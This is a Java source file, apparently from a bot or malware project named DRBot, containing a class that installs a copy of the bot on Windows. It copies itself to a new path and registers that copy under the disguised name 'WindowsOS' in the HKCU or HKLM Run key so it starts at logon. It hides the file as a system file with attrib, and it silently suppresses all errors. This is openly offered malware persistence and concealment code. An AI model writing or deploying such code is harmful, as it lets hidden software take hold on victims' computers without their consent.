package com.DRBot.Auto.Win;

import com.DRBot.BackUp.WinBackUp;
import com.DRBot.OS.OsProp;
import java.io.File;
import java.io.FilePermission;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import static java.nio.file.StandardCopyOption.REPLACE_EXISTING;

public class AutoWin {
    private WinBackUp winBackUp;
    private File mainMethod,myBot,encPath,secPath;
    private Process pro,proHider;
    private ProcessBuilder pB,pbHider;
    
    public AutoWin(File mainMethod,File botPath,File encPath,File secPath){
        this.mainMethod = mainMethod;
        this.myBot = botPath;
        this.encPath = encPath;
        this.secPath = secPath;

        if(!myBot.exists())
        {
           createBot(this.mainMethod,this.myBot);
           winBackUp = new WinBackUp(this.myBot,this.encPath.getPath(),this.secPath.getPath());
        }
    }
    private void createBot(File mainMethod,File myFile){
           try{
               
               Files.copy(mainMethod.toPath(),myFile.toPath(),REPLACE_EXISTING);
               myFile.setExecutable(true);
               myFile.setReadable(true);
               FilePermission myFilePerm = new FilePermission(myFile.getPath(),"read,execute");
               winReg(myFile.toPath());
           }
           catch(IOException cr){}
           Thread thread = new Thread(new Runnable(){
            @Override
            public void run(){
                pbHider = new ProcessBuilder("attrib","+h","+r","+s","/s","/d",myBot.getPath());
                try{
                    proHider = pbHider.start();
                    proHider.waitFor();
                }
                catch(IOException ioE){}
                catch(InterruptedException interrExe){}
                proHider.destroy();
            }
        });
        thread.start();
    }
    private void winReg(Path myFile){
        OsProp osprop = new OsProp();
        String ospropW = osprop.shortOs();
        if(ospropW.equals("win8") || ospropW.equals("win8.1")){
            pB = new ProcessBuilder("reg",
        "add",
        "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        "/v",
        "WindowsOS",
        "/d",
        myFile.toString(),
        "/f");
        try{
        pro = pB.start();
        pro.waitFor();
        pro.destroy();
        }
        catch(IOException exe){}
        catch(InterruptedException exe){}
        }
        else{
            pB = new ProcessBuilder("reg",
        "add",
        "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        "/v",
        "WindowsOS",
        "/d",
        myFile.toString(),
        "/f");
        try{
        pro = pB.start();
        pro.waitFor();
        pro.destroy();
        }
        catch(IOException exe){}
        catch(InterruptedException exe){}
        }
    }
}
